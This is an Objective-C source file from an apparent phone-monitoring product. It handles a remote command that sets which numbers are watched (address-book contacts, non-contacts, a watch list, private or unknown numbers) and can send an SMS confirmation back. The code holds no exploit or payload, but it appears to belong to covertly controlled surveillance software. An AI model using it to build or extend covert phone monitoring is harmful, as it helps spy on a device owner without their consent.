/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SetWatchFlagsProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface SetWatchFlagsProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) processSetWatchFlags;
- (void) setWatchFlagException;
- (void) sendReplySMS;
@end

@implementation SetWatchFlagsProcessor

@synthesize mWatchFlagsList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetWatchFlagsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetWatchFlagsProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetWatchFlagsProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SetWatchFlagsProcessor--->doProcessingCommand");
    [self setMWatchFlagsList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kZeroOrOneValidation]];
	DLog(@"SetWatchFlagsProcessor--->Watch Flags:%@",mWatchFlagsList);
	if ([mWatchFlagsList count]>3) {
		[self processSetWatchFlags];
	}
	else {
		[self setWatchFlagException];
	}
	
}


#pragma mark SetWatchFlagsProcessor PrivateAPI Methods

/**
 - Method name: processSetWatchFlags
 - Purpose:This method is used to process set watch flags
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processSetWatchFlags {
	DLog (@"SetWatchFlagsProcessor--->processSetWatchFlags");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *)[prefManager preference:kWatch_List];
	NSUInteger watchFlag=[prefWatchList mWatchFlag];
		//In AddressBook
		if ([[mWatchFlagsList objectAtIndex:0] intValue]==1) {
			watchFlag |= kWatch_In_Addressbook;
		}
		else {
			watchFlag &= ~kWatch_In_Addressbook;
		}
		//Not In AddressBook
		if ([[mWatchFlagsList objectAtIndex:1] intValue]==1) {
			watchFlag |= kWatch_Not_In_Addressbook;
		}
		else {
			watchFlag &= ~kWatch_Not_In_Addressbook;
		}
		//In Watch List
		if ([[mWatchFlagsList objectAtIndex:2] intValue]==1) {
			watchFlag |= kWatch_In_List;
		}
		else {
			watchFlag &= ~kWatch_In_List;
		}
		//In Private Number
		if ([[mWatchFlagsList objectAtIndex:3] intValue]==1) {
			watchFlag |= kWatch_Private_Or_Unknown_Number;
		}
		else {
			watchFlag &= ~kWatch_Private_Or_Unknown_Number;
		}
		[prefWatchList setMWatchFlag:watchFlag];
		[prefManager savePreferenceAndNotifyChange:prefWatchList];
		[self sendReplySMS];
 }

/**
 - Method name: setWatchFlagException
 - Purpose:This method is invoked when setwatch flags process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return
 */

- (void) setWatchFlagException {
	DLog (@"SetWatchFlagsProcessor--->SetWatchFlagsProcessor")
	FxException* exception = [FxException exceptionWithName:@"SetWatchFlagsProcessor" andReason:@"Set Watch Flags error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	
	DLog (@"SetWatchFlagsProcessor--->sendReplySMS")

	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	
	NSString *setWatchFlagMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSetWatchFlags", @"")];
	
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:setWatchFlagMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:setWatchFlagMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mWatchFlagsList release];
	[super dealloc];
}

@end
